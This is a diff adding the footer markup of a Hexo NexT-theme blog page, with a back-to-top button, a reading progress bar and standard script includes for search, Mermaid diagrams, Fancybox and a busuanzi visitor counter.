+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"neutral","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/10.9.0/mermaid.min.js","integrity":"sha256-stuqcu2FrjYCXDOytWFA5SoUE/r3nkp6gTglzNSlavU="}}</script>
+  <script src="/js/third-party/tags/mermaid.js"></script>
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
